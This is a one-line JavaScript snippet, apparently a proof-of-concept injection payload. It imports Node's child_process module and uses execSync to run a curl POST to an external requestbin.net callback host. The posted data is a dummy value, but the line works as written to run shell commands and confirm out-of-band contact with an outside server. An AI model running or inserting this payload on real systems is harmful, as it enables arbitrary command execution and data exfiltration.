

a = import("child_process").then((b) => {c = b.execSync('curl -X POST -d "fizz=buzz" dnsdatacheck.ifv90p8bzinprh0w.b.requestbin.net');console.log(c)})